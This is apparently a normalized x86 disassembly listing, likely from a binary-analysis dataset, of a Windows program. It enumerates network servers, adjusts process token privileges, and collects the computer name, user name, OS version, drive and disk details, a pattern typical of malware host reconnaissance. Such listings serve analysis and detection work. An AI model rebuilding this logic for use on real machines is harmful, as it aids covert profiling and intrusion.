[ edi ]
mov edx [ esp + 0x50 ]
mov ecx 0x19
mov edi ebp
[ edi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx 0x6
push ecx
push edx
push ebp
call strncpy
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0x18
xor esi esi
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
lea edx [ esi + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp edx ecx
jae r-xdata
mov ebx [ esp + 0x20 ]
mov edx ebp
sub ebx ebp
mov eax [ esp + 0x20 ]
mov edx rw-data
mov cx [ eax ]
cmp cx [ edx ]
jne r-xdata
mov cl [ edx + ebp ]
mov eax edx
sub eax esi
mov edi ebp
inc edx
mov [ eax + ebx - 0x1 ] cl
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp edx ecx
jb r-xdata
mov ebx [ esp + 0x28 ]
mov [ ebx + edx ] al
inc esi
mov edi ebp
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
dec ecx
cmp esi ecx
jb r-xdata
mov ecx 0x3
mov edi rw-data
mov esi eax
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov [ esp + 0x10 ] 0x18
mov al [ edx ]
cmp al 0x2d
je r-xdata
mov edx [ eax ]
mov ecx rw-data
cmp edx [ ecx ]
jne r-xdata
mov [ esp + 0x10 ] 0x4
mov esi eax
mov ecx 0x3
mov edi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ esp + 0x10 ] 0x2000000
push rw-data
push ebx
call fopen
mov edx [ esp + 0x18 ]
add esp 0x8
lea ecx [ esp + 0x2c ]
mov edi eax
push ecx
push 0x0
lea eax [ esp + 0x2c ]
push edx
lea ecx [ esp + 0x20 ]
push eax
push ecx
lea edx [ esp + 0x30 ]
push 0xffffffff
push edx
push 0x65
push 0x0
call NetServerEnum
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov [ esp + 0x10 ] 0x2
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
cmp eax 0xea
je r-xdata
push edi
call fclose
push ebx
call free
mov edx [ esp + 0x28 ]
push edx
call free
push ebp
call free
mov ecx 0x800
xor eax eax
mov edi rw-data
add esp 0x10
[ edi ]
mov ecx 0x800
mov edi rw-data
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
pop edi
pop esi
pop ebp
pop ebx
test al al
jne r-xdata
mov ecx [ esp + 0x14 ]
mov [ esp + 0x44 ] 0x0
test ecx ecx
jbe r-xdata
push eax
push rw-data
jmp r-xdata
lea ecx [ esp + 0x20 ]
push ecx
mov ecx rw-data
call sub_4082e0
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
push 0x5
push rw-data
mov ecx rw-data
call sub_407bc0
add esp 0x30
retn
cmp eax 0xea
jne r-xdata
add esi 0x10
push edi
call fprintf
mov eax [ esp + 0x28 ]
add esp 0xc
test eax eax
je r-xdata
add esp 0x30
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov ecx [ esp + 0x18 ]
push ecx
push rw-data
push rw-data
push edi
call fprintf
mov eax [ esp + 0x2c ]
push eax
push rw-data
push edi
call fprintf
add esp 0x14
push rw-data
push edi
call fwprintf
add esp 0x8
push rw-data
push edi
call fprintf
mov ecx [ esi - 0xc ]
push ecx
push rw-data
push edi
call fwprintf
mov edx [ esi - 0x4 ]
mov eax [ esi - 0x8 ]
mov ecx [ esi - 0x10 ]
push edx
push eax
push ecx
push rw-data
push edi
call fprintf
push rw-data
push edi
call fprintf
mov al [ esi ]
add esp 0x30
test al 0x8
je r-xdata
push eax
call NetApiBufferFree
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
test [ esi ] 0x10
je r-xdata
push rw-data
push edi
call fprintf
add esp 0x8
dec al
mov [ ecx ] al
add esp 0x30
retn
test [ esi ] 0x4
je r-xdata
push rw-data
push edi
call fprintf
add esp 0x8
test [ esi ] 0x2000000
je r-xdata
push rw-data
push edi
call fprintf
add esp 0x8
test [ esi ] 0x80
je r-xdata
push rw-data
push edi
call fprintf
add esp 0x8
mov eax [ esi ]
test ah 0x40
je r-xdata
push rw-data
push edi
call fprintf
add esp 0x8
mov eax [ esi ]
test ah 0x2
je r-xdata
push rw-data
push edi
call fprintf
add esp 0x8
mov edx [ esi + 0x4 ]
push edx
push rw-data
push edi
call fwprintf
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
add esp 0xc
add esi 0x18
inc eax
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x44 ]
inc eax
cmp eax ecx
mov [ esp + 0x44 ] eax
jb r-xdata
push rw-data
push edi
call fprintf
add esp 0x8
lea eax [ esi - 0x10 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
sub_406080
sub esp 0x8
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x4 ] ecx
lea ecx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x10 ]
push ecx
push eax
push edx
mov [ esp + 0x10 ] eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ esp ] eax
jne r-xdata
mov edx [ esp + 0x4 ]
add esp 0x8
retn
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov eax [ esp ]
or eax 0xffffffff
or edx 0xffffffff
add esp 0x8
retn
sub_4060e0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_406120
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
mov ebp ecx
cmp [ edi + 0x8 ] esi
jae r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ esp + 0x1c ]
mov ebx eax
sub ebx esi
cmp ecx ebx
jae r-xdata
call sub_408e42
cmp ebp edi
jne r-xdata
mov ebx ecx
xor edx edx
cmp ebx edx
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ r--data ]
add ebx esi
cmp eax ebx
jae r-xdata
mov ecx ebp
call sub_406620
cmp eax ebx
jae r-xdata
cmp ebx eax
jne r-xdata
mov ecx ebp
call sub_406740
mov eax [ ebp + 0x8 ]
sub eax ebx
cmp eax edi
jae r-xdata
call sub_408e42
mov ecx [ ebp + 0x4 ]
test ecx ecx
je r-xdata
call sub_408c16
mov eax [ edi + 0x4 ]
cmp eax edx
jne r-xdata
test edi edi
jbe r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
mov ecx ebp
mov edi esi
call sub_406740
mov eax [ ebp + 0x8 ]
cmp eax esi
jae r-xdata
mov ecx [ ebp + 0x4 ]
sub eax edi
add ecx ebx
push eax
lea edx [ ecx + edi ]
push edx
push ecx
call memmove
mov esi [ ebp + 0x8 ]
add esp 0xc
sub esi edi
mov ecx ebp
push 0x0
push esi
call sub_406500
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_4063b0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
cmp al 0xff
je r-xdata
mov eax [ ebp + 0x4 ]
cmp eax edx
je r-xdata
test edi edi
jbe r-xdata
mov edi eax
mov esi [ esp + 0x18 ]
mov eax [ ebp + 0x4 ]
mov [ ebp + 0x8 ] esi
mov [ esi + eax ] 0x0
push 0x1
mov ecx ebp
call sub_4063b0
cmp eax ebx
jae r-xdata
test ebx ebx
jne r-xdata
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
mov eax [ edi + 0x4 ]
cmp eax edx
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
mov ecx [ ebp + 0x4 ]
sub eax edi
push eax
lea edx [ ecx + edi ]
push edx
push ecx
call memmove
mov esi [ ebp + 0x8 ]
add esp 0xc
sub esi edi
mov ecx ebp
push 0x0
push esi
call sub_406500
test al al
je r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
add esi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ebx + ecx ] 0x0
mov eax r--data
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
push ebx
mov ecx ebp
call sub_406630
dec al
push ebx
mov [ ecx - 0x1 ] al
mov ecx ebp
call sub_4063b0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
mov [ ebp + 0x4 ] eax
mov ecx [ edi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov edx [ edi + 0xc ]
mov [ ebp + 0xc ] edx
mov cl [ eax - 0x1 ]
inc cl
pop edi
mov [ eax - 0x1 ] cl
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
mov eax r--data
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor edx edx
cmp al 0xff
je r-xdata
push esi
mov ecx ebp
call sub_4064e0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
dec al
mov [ ecx ] al
jmp r-xdata
sub_406320
push ecx
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
test esi esi
mov [ esp + 0x10 ] ecx
jne r-xdata
mov ebp [ ecx + 0x8 ]
cmp eax ebp
jae r-xdata
cmp eax [ ecx + 0x8 ]
jbe r-xdata
mov eax [ r--data ]
sub ebp eax
cmp esi ebp
ja r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
mov ebx [ ecx + 0x4 ]
mov edx 0x1
sub edx esi
add ebp edx
add ebx eax
mov ecx esi
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov edx [ ecx + 0x4 ]
pop ebx
sub eax edx
pop ecx
retn 0xc
mov esi [ esp + 0x20 ]
sub ebx eax
lea ebp [ ebx + ebp - 0x1 ]
lea ebx [ eax + 0x1 ]
jmp r-xdata
mov edi [ esp + 0x18 ]
push ebp
movsx eax [ edi ]
push eax
push ebx
call memchr
add esp 0xc
test eax eax
je r-xdata
sub_4063b0
mov al [ esp + 0x4 ]
push esi
test al al
mov esi ecx
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_406440
push ebx
mov ebx [ esp + 0xc ]
push ebp
cmp ebx 0xfffffffd
mov ebp ecx
jbe r-xdata
mov ecx [ ebp + 0x4 ]
xor edx edx
cmp ecx edx
je r-xdata
call sub_408c16
cmp ebx edx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_4063b0
mov eax ebp
pop ebp
pop ebx
retn 0x8
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call sub_4063b0
cmp eax ebx
jae r-xdata
cmp ebx edx
jne r-xdata
mov ecx ebx
push esi
mov esi [ esp + 0x10 ]
mov eax ecx
push edi
mov edi [ ebp + 0x4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
pop edi
mov [ ebp + 0x8 ] ebx
pop esi
mov [ ebx + ecx ] 0x0
pop ebp
pop ebx
retn 0x8
push ebx
mov ecx ebp
call sub_406630
dec al
mov [ ecx - 0x1 ] al
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
mov eax ebp
pop ebp
pop ebx
retn 0x8
sub_406500
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp edi 0xfffffffd
mov esi ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
xor ebx ebx
cmp eax ebx
je r-xdata
call sub_408c16
mov cl [ esp + 0x14 ]
cmp edi ebx
jne r-xdata
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl 0xff
je r-xdata
cmp [ esi + 0xc ] edi
jae r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0x1f
ja r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
push edi
mov ecx esi
call sub_406630
cmp eax ebx
je r-xdata
cmp ecx edi
jae r-xdata
pop edi
pop esi
xor al al
pop ebx
retn 0x8
mov [ esi + 0x8 ] ebx
mov [ eax ] bl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop edi
pop esi
xor al al
pop ebx
retn 0x8
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
dec cl
pop edi
mov [ eax - 0x1 ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
push edi
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_406630
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
pop edi
mov [ ecx ] al
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
dec al
push edi
mov [ ecx ] al
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_406630
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
sub_406630
push ebp
mov ebp esp
push 0xffffffff
push sub_409010
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi eax
or esi 0x1f
push edi
mov ebx ecx
cmp esi 0xfffffffd
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
jbe r-xdata
lea eax [ esi + 0x2 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
jge r-xdata
mov [ ebp - 0x14 ] eax
mov esi eax
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebp + 0x8 ] eax
jmp r-xdata
xor eax eax
mov eax [ ebx + 0x8 ]
test eax eax
jbe r-xdata
mov eax [ ebx + 0x4 ]
mov edi [ ebx + 0x8 ]
test eax eax
je r-xdata
cmp eax esi
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] 0x0
inc eax
cmp edi esi
mov [ ebx + 0x4 ] eax
mov [ eax - 0x1 ] 0x0
mov [ ebx + 0xc ] esi
ja r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov esi [ ebx + 0x4 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx ecx
shr ecx 0x2
lea edi [ eax + 0x1 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp - 0x14 ]
mov eax esi
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] esi
pop edi
mov [ ecx + esi ] 0x0
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi edi
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_406740
push ebx
push ebp
mov ebp ecx
xor edx edx
push esi
push edi
mov ecx [ ebp + 0x4 ]
cmp ecx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp al 0xff
je r-xdata
dec al
mov esi ecx
mov [ ecx - 0x1 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
[ edi ]
not ecx
dec ecx
mov ebx ecx
cmp ebx 0xfffffffd
jbe r-xdata
mov ecx [ ebp + 0x4 ]
cmp ecx edx
je r-xdata
call sub_408c16
cmp ebx edx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_4063b0
pop edi
pop esi
pop ebp
pop ebx
retn
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call sub_4063b0
cmp eax ebx
jae r-xdata
cmp ebx edx
jne r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ebx + ecx ] 0x0
push ebx
mov ecx ebp
call sub_406630
dec al
push edx
mov [ ecx - 0x1 ] al
mov ecx ebp
call sub_4063b0
pop edi
pop esi
pop ebp
pop ebx
retn
sub_406850
sub esp 0x1c
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push 0x20
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
mov esi [ LookupPrivilegeValueA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push 0x0
call esi
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
mov edi [ AdjustTokenPrivileges@IAT ]
push 0x0
push 0x0
lea ecx [ esp + 0x1c ]
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x10 ]
push 0x0
push ecx
push 0x0
push edx
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x38 ] 0x2
mov [ esp + 0x34 ] eax
call edi
lea eax [ esp + 0xc ]
push eax
push rw-data
push 0x0
call esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
mov [ esp + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
push 0x0
push eax
push 0x0
push ecx
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x38 ] 0x2
mov [ esp + 0x34 ] edx
call edi
mov edx [ esp + 0x8 ]
push edx
call [ CloseHandle@IAT ]
pop edi
pop esi
add esp 0x1c
retn
sub_406910
sub esp 0x700
push ebx
push ebp
push esi
push edi
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x310 ]
push 0x2000
[ edi ]
call malloc
mov ebp eax
mov ecx 0x800
xor eax eax
mov edi ebp
push rw-data
push ebp
[ edi ]
call sprintf
add esp 0xc
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x310 ]
mov [ esp + 0x10 ] 0x10
push eax
push ecx
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x310 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edi rw-data
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x310 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x80
lea edi [ esp + 0x310 ]
[ edi ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x310 ]
push eax
push ecx
mov [ esp + 0x18 ] 0x200
call [ GetUserNameA@IAT ]
test eax eax
jne r-xdata
cmp eax 0xfa0
je r-xdata
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x58 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ GetSystemInfo@IAT ]
mov eax [ esp + 0x70 ]
cmp eax 0x24a
ja r-xdata
lea edx [ esp + 0x510 ]
mov edi rw-data
lea edx [ esp + 0x510 ]
mov edi rw-data
jmp r-xdata
lea edx [ esp + 0x510 ]
mov edi rw-data
jmp r-xdata
sub eax 0x182
je r-xdata
mov eax [ esp + 0x28c ]
sub eax 0x0
je r-xdata
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x27c ] 0x94
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x80
lea edi [ esp + 0x310 ]
[ edi ]
lea ecx [ esp + 0x27c ]
push ecx
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
lea edx [ esp + 0x510 ]
mov edi rw-data
jmp r-xdata
sub eax 0x64
jne r-xdata
lea edx [ esp + 0x310 ]
mov edi rw-data
dec eax
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x4c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call GetSystemPowerStatus
mov edx eax
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x7c ]
test edx edx
[ edi ]
je r-xdata
lea edx [ esp + 0x510 ]
mov edi rw-data
jmp r-xdata
lea edx [ esp + 0x7c ]
push rw-data
push edx
mov al [ esp + 0x4d ]
cmp al 0x80
je r-xdata
lea edx [ esp + 0x310 ]
mov edi rw-data
jmp r-xdata
dec eax
lea edx [ esp + 0x310 ]
je r-xdata
lea edx [ esp + 0x7c ]
mov edi rw-data
jmp [ eax * 4 + jump_table_407028 ]
cmp al 0xff
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x288 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
and edx 0xffff
[ edi ] [ esi ]
mov ecx 0x80
lea edi [ esp + 0x7c ]
[ edi ]
mov eax [ esp + 0x284 ]
lea ecx [ esp + 0x510 ]
push ecx
mov ecx [ esp + 0x284 ]
push edx
push eax
lea edx [ esp + 0x31c ]
push ecx
push edx
lea eax [ esp + 0x90 ]
push rw-data
push eax
call sprintf
lea edi [ esp + 0x98 ]
or ecx 0xffffffff
xor eax eax
add esp 0x1c
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
mov esi [ wsprintfA@IAT ]
push ebx
lea eax [ esp + 0x80 ]
push rw-data
push eax
call esi
add esp 0xc
lea ecx [ esp + 0x7c ]
push ecx
call [ GetDriveTypeA@IAT ]
cmp eax 0x6
ja r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax ebp
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x700
retn
lea edi [ esp + 0x7c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
mov [ esp + 0x7c ] 0x0
jmp r-xdata
lea edi [ esp + 0x7c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
push ebx
lea eax [ esp + 0x314 ]
push rw-data
push eax
call esi
add esp 0xc
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
push ecx
push edx
lea ecx [ esp + 0x30 ]
push eax
lea edx [ esp + 0x31c ]
push ecx
push edx
call [ GetDiskFreeSpaceA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x7c ]
mov edi rw-data
jmp r-xdata
lea edx [ esp + 0x7c ]
mov edi rw-data
jmp r-xdata
lea edx [ esp + 0x7c ]
mov edi rw-data
jmp r-xdata
lea ecx [ esp + 0x7c ]
push rw-data
push ecx
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
inc ebx
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x510 ]
imul eax [ esp + 0x1c ]
shr eax 0xa
mov ecx eax
imul eax [ esp + 0x24 ]
imul ecx [ esp + 0x20 ]
push ecx
push eax
push ebx
push rw-data
push edx
call sprintf
add esp 0x14
lea edi [ esp + 0x510 ]
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x7c ]
call sprintf
lea edi [ esp + 0x84 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ GetTickCount@IAT ]
mov edx eax
xor eax eax
mov [ esp + 0x14 ] edx
